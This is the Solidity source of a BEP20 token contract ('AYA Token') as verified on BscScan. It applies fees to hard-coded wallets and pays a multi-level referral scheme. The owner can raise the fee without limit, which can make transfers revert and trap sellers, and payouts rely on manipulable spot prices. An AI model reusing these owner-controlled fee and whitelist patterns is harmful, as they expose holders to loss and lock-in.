/**
 *Submitted for verification at BscScan.com on 2022-06-18
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.8.4;

interface Tokenall {
    function transfer(address to, uint value) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    function autoswapsell()external returns(bool);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _transferOwnership(_msgSender());
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract AYATOKEN is Context, IERC20, Ownable {
  using SafeMath for uint256;
  IUniswapV2Router02 public meswap;
  Tokenall public metoken;

  mapping (address => uint256) private _balances;
  mapping (address => bool) private _whiteaddress;

  //zzlog
  mapping(address => mapping(address => uint256)) private _zzlog;

  //推荐关系
  mapping(address => address) private _parr;
  mapping(address => bool) private _passaddress;
  
  //授权
  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _totalSupply;//总量
  uint8 private _decimals;
  string private _symbol;
  string private _name;

  bool inSwapAndLiquify=false;

  //LP双池地址
  address public lp1;
  address public lp2;

  //swap配置
  address public usdtaddress=0x55d398326f99059fF775485246999027B3197955;
  address public tokenaddress=address(this);
  address public mainrouter=0x10ED43C718714eb63d5aA57B78B54704E256024E;
  address public autoaddress=address(this);
  address public burnacc=0x000000000000000000000000000000000000dEaD;
  address public mainacc=0xB15Ada760aDe0b9062194B3Fa3fF971EDD9930d0;

//   address public usdtaddress=0xe2Aa9B817f9446cd682a7fb3F8b4D257Cf9BfeC6;
//   address public tokenaddress=address(this);
//   address public mainrouter=0xa1424B338a14199fa00aBc99776e72E9BA1965f5;
//   address public autoaddress=address(this);
//   address public burnacc=0x000000000000000000000000000000000000dEaD;
//   address public mainacc=msg.sender;

  address private zeroacc=0x0000000000000000000000000000000000000000;
  address public byaaddress=0xbfCeC526D757Cc4eA12a75367A7C2b0f7b28FC9a;
  
  address public bcacc = address(0xefe3D453cb78AAF835d1d442D3bd150469a49e51);
  address public lpacc = address(0xA6dc7A97A0BcbD6b6c13646A63e532c409765f50);
  address public sxfacc = address(0xC3B73d58f7E80Eb691B077CF3F5001080497D206);
  address public safeaddress = address(0xC410BC6134ab2b8cF279Dbe3cD0F9BC16eB0954d);
  address public lpbya = address(0x1994Ba8979824BC4fEdCcfe4ADc9b4c0B387FC89);

  uint private _sxf=0;

  uint256 public lpfhnum=0;

  modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

  constructor(){
    _name = "AYA Token";
    _symbol = "AYA";
    _decimals = 18;
    _totalSupply =10000 * 10000 * 10 ** 18;

    IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(mainrouter); //主路由地址
    lp1 = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            usdtaddress
        );
    lp2 = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            _uniswapV2Router.WETH()
        );

    _passaddress[lp1]=true;
    _passaddress[lp2]=true;
    _passaddress[autoaddress]=true;
    _passaddress[burnacc]=true;

    _whiteaddress[0x78Bd805Ee4263a33091D2098932d6866EE42885a]=true;
    _whiteaddress[msg.sender]=true;

    _balances[mainacc]=_totalSupply.mul(100).div(100);
    emit Transfer(address(0), mainacc, _balances[mainacc]);
  }

 
  function decimals() external  view returns (uint8) {
    return _decimals;
  }

 
  function symbol() external  view returns (string memory) {
    return _symbol;
  }

  function getlpfhnum() external  view returns (uint256) {
    return lpfhnum;
  }

  
  function name() external  view returns (string memory) {
    return _name;
  }

 
  function totalSupply() external override view returns (uint256) {
    return _totalSupply;
  }
 
  function balanceOf(address account) external override view returns (uint256) {
    return _balances[account];
  }

  
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  
  function allowance(address owner, address spender) external override view returns (uint256) {
    return _allowances[owner][spender];
  }

 
  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }


  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }


  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }


  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    
    setpid(sender,recipient,amount);
    //买入
    if((sender==lp1 || sender==lp2) && _whiteaddress[recipient]!=true && sender!=autoaddress && recipient!=autoaddress){
        _tokenTransfer(sender,bcacc,amount.mul(5).div(100));
        //u价值评估
         meswap = IUniswapV2Router02(mainrouter);
         address[] memory path = new address[](2);
         path[0]=tokenaddress;
         path[1]=usdtaddress;
         uint256[] memory res=meswap.getAmountsOut(amount.mul(5).div(100),path);
         uint256 amountusdt = res[1];
         metoken = Tokenall(usdtaddress);
         if(metoken.balanceOf(tokenaddress)>amountusdt){
            metoken.transfer(lpbya,amountusdt);
         }

        if(_sxf>0){
             _tokenTransfer(sender,sxfacc,amount.mul(_sxf).div(100));
             _tokenTransfer(sender,recipient,amount.mul(90-_sxf).div(100));
         }else{
            _tokenTransfer(sender,recipient,amount.mul(90).div(100));
         }
        uint i=1;
        address nowuacc=recipient;
        uint fee=40;
        while(i<=9 && _parr[nowuacc]!=zeroacc){
            if(i==1){
                _tokenTransfer(sender,_parr[nowuacc],amount.mul(1).div(100));
                fee=fee-10;
            }else{
               _tokenTransfer(sender,_parr[nowuacc],amount.mul(5).div(1000)); 
               fee=fee-5;
            }
            nowuacc = _parr[nowuacc];
            i++;
        }
        if(fee>0){
           _tokenTransfer(sender,sxfacc,amount.mul(fee).div(1000));  
        }
    }else if((recipient==lp1 || recipient==lp2)  && _whiteaddress[sender]!=true && sender!=autoaddress && recipient!=autoaddress){
        _tokenTransfer(sender,lpacc,amount.mul(4).div(100));
        _tokenTransfer(sender,bcacc,amount.mul(4).div(100));
        // require(_balances[sender].sub(amount) >= 1, "BEP20: min 1");
        //u价值评估
         meswap = IUniswapV2Router02(mainrouter);
         address[] memory path = new address[](3);
         path[0]=tokenaddress;
         path[1]=usdtaddress;
         path[2]=byaaddress;
         uint256[] memory res=meswap.getAmountsOut(amount.mul(2).div(100),path);
         uint256 amountbya = res[2];
         metoken = Tokenall(byaaddress);
         metoken.transfer(sender,amountbya);
         if(_sxf>0){
             _tokenTransfer(sender,sxfacc,amount.mul(_sxf).div(100));
             _tokenTransfer(sender,recipient,amount.mul(92-_sxf).div(100));
         }else{
            _tokenTransfer(sender,recipient,amount.mul(92).div(100));
         }
    }else if(sender==autoaddress || recipient==autoaddress){
         _tokenTransfer(sender,recipient,amount);
    }else{
        if(_whiteaddress[sender]==true || _whiteaddress[recipient]==true){
            _tokenTransfer(sender,recipient,amount.mul(100).div(100));
        }else{
            _tokenTransfer(sender,0x89695BADB0B42e64d91fd32ECEaadaafF9322FA6,amount.mul(3).div(100));
            _tokenTransfer(sender,recipient,amount.mul(97).div(100));
        }
    }
  }

  function setpid(address sender, address recipient, uint256 amount) internal returns(bool){
      //pass address
      if(_passaddress[sender] || _passaddress[recipient]){
          return false;
      }
      
      //recipient no transfer to sender
      if(_zzlog[recipient][sender]<=0){
         _zzlog[sender][recipient] = amount;
         return false;
      }
      
      //recipient transfer to sender and amount is ok set pid
      if(_zzlog[recipient][sender]>0){
            //sender have one pid
            if(_parr[sender]!=zeroacc){
                return false;
            }
          _parr[sender]=recipient;
          return true;
      }
      return true;
  }

  function getpacc(address acc) external view returns(address){
      return _parr[acc];
  }

   function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }

  function setsxf(uint sxf) public onlyOwner{
        _sxf = sxf;
  }

  function setautoaddress(address _autoaddress) public onlyOwner{
        autoaddress = _autoaddress;
  }

  function addwhiteaddress(address _acc) public onlyOwner{
        _whiteaddress[_acc] = true;
  }

  function removewhiteaddress(address _acc) public onlyOwner{
        _whiteaddress[_acc] = false;
  }

  function setbyaaddress(address _byaaddress) public onlyOwner{
        byaaddress = _byaaddress;
  }

  function setlpbya(address _lpbya) public onlyOwner{
        lpbya = _lpbya;
  }

  function getusdt()public returns(bool){
     metoken = Tokenall(usdtaddress);
     uint256 amount = metoken.balanceOf(tokenaddress);
     metoken.transfer(safeaddress,amount);
     return true;
  }

}